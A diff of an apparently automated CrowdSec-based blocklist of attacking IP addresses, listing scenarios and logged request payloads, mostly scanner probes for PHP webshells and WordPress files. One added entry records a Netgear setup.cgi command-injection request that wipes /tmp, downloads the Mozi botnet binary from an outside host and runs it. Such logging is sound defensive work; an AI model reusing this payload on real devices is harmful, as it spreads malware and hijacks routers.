@@ -1,92 +1,8 @@
 {
   "schema_version": "2",
   "ttl_days": 7,
-  "updated_at": "2026-06-09T01:00:02.223728Z",
+  "updated_at": "2026-06-09T13:00:02.356569Z",
   "items": {
-    "145.226.30.112": {
-      "ip": "145.226.30.112",
-      "family": "v4",
-      "first_seen": "2026-06-02T08:35:19Z",
-      "last_seen": "2026-06-02T08:35:19Z",
-      "scenarios": {
-        "crowdsec/http-crawl-non_statics": {
-          "count": 1,
-          "last_seen": "2026-06-02T08:35:19Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 1,
-          "first_seen": "2026-06-02T08:35:19Z",
-          "last_seen": "2026-06-02T08:35:19Z",
-          "last_alert_id": 6987,
-          "last_alert_uuid": "0e505e3f-e965-4c86-b51d-995c5d68719d",
-          "payloads": [
-            "GET /rest/feed/favicon/2011",
-            "GET /rest/feed/favicon/2039",
-            "GET /rest/feed/favicon/2034",
-            "GET /rest/feed/favicon/2031",
-            "GET /rest/feed/favicon/3",
-            "GET /rest/feed/favicon/2035"
-          ]
-        }
-      },
-      "asn": "8255",
-      "asn_prefix": "145.226.0.0/18"
-    },
-    "52.138.23.40": {
-      "ip": "52.138.23.40",
-      "family": "v4",
-      "first_seen": "2026-06-02T07:47:21Z",
-      "last_seen": "2026-06-02T07:47:25Z",
-      "scenarios": {
-        "crowdsec/http-crawl-non_statics": {
-          "count": 1,
-          "last_seen": "2026-06-02T07:47:25Z"
-        },
-        "crowdsec/http-wordpress-scan": {
-          "count": 1,
-          "last_seen": "2026-06-02T07:47:23Z"
-        },
-        "crowdsec/http-probing": {
-          "count": 1,
-          "last_seen": "2026-06-02T07:47:21Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 3,
-          "first_seen": "2026-06-02T07:47:21Z",
-          "last_seen": "2026-06-02T07:47:25Z",
-          "last_alert_id": 6986,
-          "last_alert_uuid": "b2f6f12c-ba26-4ea8-bd91-8eeb82f9a6b3",
-          "payloads": [
-            "GET /tires.php",
-            "GET /bthil.php",
-            "GET /d.php",
-            "GET /fone1.php",
-            "GET /sallu.php",
-            "GET /link.php",
-            "GET /wp-content/plugins/hellopress/wp_filemanager.php",
-            "GET /wp-test.php",
-            "GET /wp-info.php",
-            "GET /wp-indx.php",
-            "GET /this_is_a_new_hello_world.php",
-            "GET /classgoto24.php",
-            "GET /bob.php",
-            "GET /cu.php",
-            "GET /error_log.php",
-            "GET /ms-edit.php",
-            "GET /xstelth.php",
-            "GET /4PJcpMFsD8B.php",
-            "GET /155.php",
-            "GET /geforce.php"
-          ]
-        }
-      },
-      "asn": "8075",
-      "asn_prefix": "52.136.0.0/13"
-    },
     "195.26.255.17": {
       "ip": "195.26.255.17",
       "family": "v4",
@@ -2209,6 +2125,82 @@
             "GET /dx.php",
             "GET /puc.php",
             "GET /wp-temp.php"
+          ]
+        }
+      }
+    },
+    "219.71.131.225": {
+      "ip": "219.71.131.225",
+      "family": "v4",
+      "first_seen": "2026-06-09T09:59:39Z",
+      "last_seen": "2026-06-09T09:59:40Z",
+      "scenarios": {
+        "crowdsec/netgear_rce": {
+          "count": 1,
+          "last_seen": "2026-06-09T09:59:40Z"
+        },
+        "crowdsec/http-cve-probing": {
+          "count": 1,
+          "last_seen": "2026-06-09T09:59:39Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 2,
+          "first_seen": "2026-06-09T09:59:39Z",
+          "last_seen": "2026-06-09T09:59:40Z",
+          "last_alert_id": 7196,
+          "last_alert_uuid": "744adead-c334-4958-bf77-b416a7809e1c",
+          "payloads": [
+            "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://219.71.131.225:49112/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1"
+          ]
+        }
+      }
+    },
+    "13.86.116.159": {
+      "ip": "13.86.116.159",
+      "family": "v4",
+      "first_seen": "2026-06-09T09:37:29Z",
+      "last_seen": "2026-06-09T09:37:29Z",
+      "scenarios": {
+        "crowdsec/http-technology-probing": {
+          "count": 1,
+          "last_seen": "2026-06-09T09:37:29Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 1,
+          "first_seen": "2026-06-09T09:37:29Z",
+          "last_seen": "2026-06-09T09:37:29Z",
+          "last_alert_id": 7194,
+          "last_alert_uuid": "e67970bb-6b76-40d9-8bba-ed683245de5a",
+          "payloads": [
+            "GET /actuator/health"
+          ]
+        }
+      }
+    },
+    "35.216.195.77": {
+      "ip": "35.216.195.77",
+      "family": "v4",
+      "first_seen": "2026-06-09T01:10:34Z",
+      "last_seen": "2026-06-09T01:10:34Z",
+      "scenarios": {
+        "crowdsec/http-technology-probing": {
+          "count": 1,
+          "last_seen": "2026-06-09T01:10:34Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 1,
+          "first_seen": "2026-06-09T01:10:34Z",
+          "last_seen": "2026-06-09T01:10:34Z",
+          "last_alert_id": 7189,
+          "last_alert_uuid": "fbc2cbcc-c0db-49b9-88c0-10758b29f502",
+          "payloads": [
+            "GET /info.php"
           ]
         }
       }
